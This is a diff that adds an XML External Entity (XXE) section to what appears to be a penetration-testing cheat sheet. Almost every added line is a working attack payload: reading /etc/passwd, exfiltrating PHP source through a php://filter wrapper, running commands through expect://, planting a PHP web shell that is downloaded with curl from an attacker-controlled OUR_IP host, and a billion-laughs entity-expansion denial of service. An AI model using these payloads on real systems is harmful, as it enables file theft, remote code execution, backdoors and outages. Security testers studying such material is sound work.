@@ -1272,6 +1272,151 @@ done
 #21. - XML External Entity (XXE) Injection
 -----------------------------------------
 
+- XXE Print Text
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [
+   <!ENTITY company "Big Old Test String">
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &company;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
+- Local File Inclusion (LFI)
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [
+   <!ENTITY company SYSTEM "file:///etc/passwd">
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &company;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
+- PHP Wrapper Filter
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [
+   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &company;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
+- Code Execution
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [
+   <!ENTITY company SYSTEM "expect://whoami">
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &company;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
+- Web Shell
+
+```
+$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+$ sudo python3 -m http.server 80
+
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [
+   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &company;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
+- Denial of Service (DoS)
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [
+   <!ENTITY a0 "DOS" >
+   <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+   <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+   <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+   <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+   <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+   <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+   <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+   <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+   <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+   <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &company;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
 #22. - Sensitive Data Exposure
 -----------------------------------------
 
